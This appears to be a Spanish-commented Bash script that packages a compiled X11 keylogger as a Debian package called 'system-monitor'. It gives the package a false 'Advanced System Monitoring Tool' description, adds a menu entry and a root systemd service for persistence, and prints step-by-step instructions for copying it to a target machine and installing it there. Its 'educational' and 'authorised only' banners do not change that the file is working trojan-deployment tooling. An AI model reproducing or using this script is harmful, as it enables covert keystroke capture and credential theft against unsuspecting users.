#!/bin/bash
# create_malicious_deb.sh
# Crea un paquete .deb que instala el keylogger como "system-monitor"
# Uso: ./create_malicious_deb.sh

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}[*] Generador de Paquete DEB Educativo${NC}"
echo -e "${YELLOW}[!] Solo para entornos autorizados${NC}\n"

# Verificar que el keylogger esté compilado
if [ ! -f "x11_keylogger" ]; then
    echo -e "${RED}[!] x11_keylogger no encontrado. Compilando...${NC}"
    make || exit 1
fi

# Nombre del paquete
PKG_NAME="system-monitor"
PKG_VERSION="1.0.0"
PKG_DIR="${PKG_NAME}_${PKG_VERSION}"

# Limpiar directorio anterior si existe
rm -rf "$PKG_DIR" 2>/dev/null || true

# Crear estructura de directorios del paquete
echo -e "${GREEN}[*] Creando estructura del paquete...${NC}"
mkdir -p "$PKG_DIR/DEBIAN"
mkdir -p "$PKG_DIR/usr/local/bin"
mkdir -p "$PKG_DIR/usr/share/applications"
mkdir -p "$PKG_DIR/etc/systemd/system"

# Copiar el binario
cp x11_keylogger "$PKG_DIR/usr/local/bin/system-monitor"
chmod 755 "$PKG_DIR/usr/local/bin/system-monitor"

# Crear archivo control (metadatos del paquete)
cat > "$PKG_DIR/DEBIAN/control" <<EOF
Package: system-monitor
Version: $PKG_VERSION
Section: utils
Priority: optional
Architecture: amd64
Depends: libx11-6, libxtst6
Maintainer: System Tools <admin@example.com>
Description: Advanced System Monitoring Tool
 Herramienta avanzada de monitoreo del sistema para entornos X11.
 Proporciona análisis en tiempo real de eventos del sistema y
 rendimiento de aplicaciones.
 .
 Características:
  - Monitoreo de eventos del sistema
  - Análisis de rendimiento
  - Compatible con X11
  - Bajo consumo de recursos
EOF

# Crear script postinst (se ejecuta después de la instalación)
cat > "$PKG_DIR/DEBIAN/postinst" <<'EOF'
#!/bin/bash
# Script de post-instalación

set -e

echo "Configurando System Monitor..."

# Crear directorio de configuración
mkdir -p /var/log/system-monitor

# Configurar permisos
chmod 755 /usr/local/bin/system-monitor

# Crear enlace simbólico (opcional)
ln -sf /usr/local/bin/system-monitor /usr/bin/sysmon 2>/dev/null || true

echo "System Monitor instalado correctamente."
echo "Para ejecutar: system-monitor o sysmon"

exit 0
EOF

chmod 755 "$PKG_DIR/DEBIAN/postinst"

# Crear script prerm (se ejecuta antes de desinstalar)
cat > "$PKG_DIR/DEBIAN/prerm" <<'EOF'
#!/bin/bash
# Script de pre-desinstalación

set -e

echo "Deteniendo System Monitor..."

# Detener procesos del monitor
pkill -f system-monitor || true

# Eliminar enlace simbólico
rm -f /usr/bin/sysmon 2>/dev/null || true

exit 0
EOF

chmod 755 "$PKG_DIR/DEBIAN/prerm"

# Crear archivo .desktop para el menú de aplicaciones
cat > "$PKG_DIR/usr/share/applications/system-monitor.desktop" <<EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=System Monitor
Comment=Advanced System Monitoring Tool
Exec=/usr/local/bin/system-monitor
Icon=utilities-system-monitor
Terminal=true
Categories=System;Monitor;
Keywords=monitor;system;performance;
StartupNotify=false
EOF

# Crear servicio systemd (opcional para persistencia)
cat > "$PKG_DIR/etc/systemd/system/system-monitor.service" <<EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=forking
User=root
ExecStart=/usr/local/bin/system-monitor
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF

# Construir el paquete .deb
echo -e "${GREEN}[*] Construyendo paquete .deb...${NC}"
dpkg-deb --build "$PKG_DIR"

if [ -f "${PKG_DIR}.deb" ]; then
    echo ""
    echo -e "${GREEN}[✓] Paquete creado exitosamente: ${PKG_DIR}.deb${NC}"
    echo ""
    echo -e "${YELLOW}=== INSTRUCCIONES DE USO ===${NC}"
    echo ""
    echo "1. Transferir el paquete al objetivo:"
    echo "   scp ${PKG_DIR}.deb usuario@target:/tmp/"
    echo ""
    echo "2. En el sistema objetivo, instalar:"
    echo "   sudo dpkg -i /tmp/${PKG_DIR}.deb"
    echo "   sudo apt-get install -f  # Si hay dependencias faltantes"
    echo ""
    echo "3. Verificar instalación:"
    echo "   dpkg -l | grep system-monitor"
    echo "   which system-monitor"
    echo ""
    echo "4. Ejecutar:"
    echo "   system-monitor"
    echo ""
    echo -e "${YELLOW}=== VERIFICACIÓN POST-INSTALACIÓN ===${NC}"
    echo "   ps aux | grep system-monitor"
    echo "   sudo systemctl status system-monitor  # Si se habilitó el servicio"
    echo ""
    echo -e "${YELLOW}=== PARA DESINSTALAR ===${NC}"
    echo "   sudo dpkg -r system-monitor"
    echo ""
    
    # Generar hash del paquete
    SHA256=$(sha256sum "${PKG_DIR}.deb" | cut -d' ' -f1)
    echo -e "${GREEN}SHA256: $SHA256${NC}"
    echo "$SHA256  ${PKG_DIR}.deb" > "${PKG_DIR}.deb.sha256"
    
else
    echo -e "${RED}[!] Error al crear el paquete${NC}"
    exit 1
fi

# Limpiar directorio temporal
# Comentar la siguiente línea si quieres inspeccionar la estructura
# rm -rf "$PKG_DIR"

echo -e "${GREEN}[*] Proceso completado${NC}"
